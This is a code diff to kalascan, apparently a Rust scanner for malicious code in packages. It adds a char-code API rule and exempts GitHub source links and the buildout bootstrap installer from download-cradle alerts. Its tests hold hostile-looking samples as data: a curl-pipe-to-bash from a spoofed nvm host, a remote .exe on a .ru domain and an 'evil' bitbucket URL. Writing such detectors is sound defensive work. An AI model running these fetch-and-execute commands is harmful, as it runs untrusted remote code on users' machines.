@@ -4,7 +4,7 @@ use std::path::Path;
 use walkdir::WalkDir;
 
 /// Human-readable ruleset version (also surfaced by `kalascan rules`).
-pub const RULESET_VERSION: &str = "2026.10.1";
+pub const RULESET_VERSION: &str = "2026.11.1";
 
 /// Critical file extensions for scanning
 // `.yml`/`.yaml` get only the exfiltration, network, supply-chain and
@@ -72,6 +72,7 @@ pub const SHELL_PROFILE: &str = "Shell Profile Modification";
 pub const NPM_PUBLISH: &str = "npm Publish from Code";
 pub const FETCH_EVAL: &str = "Download Cradle (fetch then eval)";
 pub const HEX_API: &str = "Hex-Encoded API Name";
+pub const CHARCODE_API: &str = "Char-Code Encoded API Name";
 pub const INSTALL_NET: &str = "Install Script Network Command";
 pub const INSTALL_RECON: &str = "Install Script Host Reconnaissance";
 pub const DNS_BUILT: &str = "DNS Lookup of Built Hostname";
@@ -899,7 +900,9 @@ fn scan_bytes(
             {
                 continue;
             }
-            if !keep_hit(&rule.name, text) {
+            if !keep_hit(&rule.name, text)
+                || (rule.name == FETCH_EVAL && fetches_vendor_installer(&content[end..]))
+            {
                 continue;
             }
             offsets.push(start);
@@ -978,7 +981,26 @@ pub(crate) fn keep_hit(rule: &str, text: &str) -> bool {
     if is_ip_rule && !is_public_ipv4(text.rsplit('/').next().unwrap_or_default()) {
         return false;
     }
+    // `github.com/o/r/blob/<sha>/t/test-lib.sh#L90` is a link to a line of
+    // source (an HTML page), not a download; `?raw=true` makes it one.
+    if rule == REMOTE_BINARY && text.contains("/blob/") && !text.contains("raw=true") {
+        return false;
+    }
     !((rule == REMOTE_BINARY || rule == DOWNLOAD_CRADLE) && is_vendor_download(text))
+}
+
+/// `exec(urlopen('https://bitbucket.org/pypa/setuptools/raw/…/ez_setup.py'))`:
+/// the old zc.buildout `bootstrap.py`, fetching the packaging tools' own
+/// installer. `after` is the text that follows the matched `exec(urlopen(`.
+fn fetches_vendor_installer(after: &str) -> bool {
+    let window = &after[..floor_boundary(after, 300)];
+    window.find("http").is_some_and(|i| {
+        let url = window[i..]
+            .split(['"', '\'', ')', ' ', '\n'])
+            .next()
+            .unwrap_or_default();
+        is_vendor_download(url)
+    })
 }
 
 /// Official vendor download / installer hosts: Playwright fetching Chrome
@@ -1005,6 +1027,7 @@ fn is_vendor_download(url: &str) -> bool {
         "docker.com",
         "playwright.dev",
         "apple.com",
+        "pypa.io",
         // GitHub's own link shortener (Copilot CLI installer).
         "gh.io",
         // The whole TLD is run by Google (Antigravity CLI installer).
@@ -1015,6 +1038,7 @@ fn is_vendor_download(url: &str) -> bool {
         "raw.githubusercontent.com/nvm-sh/nvm/",
         "raw.githubusercontent.com/creationix/nvm/",
         "raw.githubusercontent.com/homebrew/install/",
+        "bitbucket.org/pypa/setuptools/",
     ];
     let Some(rest) = url.split("://").nth(1) else {
         return false;
@@ -1249,6 +1273,7 @@ mod tests {
             NPM_PUBLISH,
             FETCH_EVAL,
             HEX_API,
+            CHARCODE_API,
             INSTALL_NET,
             INSTALL_RECON,
             DNS_BUILT,
@@ -1333,6 +1358,29 @@ mod tests {
         assert!(!is_vendor_download(
             "curl https://raw.githubusercontent.com/nvm-sh-evil/nvm/x.sh | bash"
         ));
+    }
+
+    #[test]
+    fn source_links_and_the_buildout_bootstrap_are_not_downloads() {
+        // A link to a line of a shell script, inside a webpack `eval` module (sourcecred).
+        let link = "https://github.com/git/git/blob/1f1cddd5/t/test-lib.sh#";
+        assert!(!keep_hit(REMOTE_BINARY, link));
+        assert!(keep_hit(
+            REMOTE_BINARY,
+            "https://github.com/x/y/blob/main/a.exe?raw=true\""
+        ));
+        assert!(keep_hit(
+            REMOTE_BINARY,
+            "http://paxfallow.ru/Lightshot.exe\""
+        ));
+        // zc.buildout's bootstrap.py (xbob.paper.jmlr2013).
+        assert!(fetches_vendor_installer(
+            "\n    'https://bitbucket.org/pypa/setuptools/raw/0.7.2/ez_setup.py'\n  ).read(), ez)"
+        ));
+        assert!(!fetches_vendor_installer(
+            "'https://bitbucket.org/evil/x/raw/a.py').read())"
+        ));
+        assert!(!fetches_vendor_installer("Request(url=u)).read())"));
     }
 
     #[test]
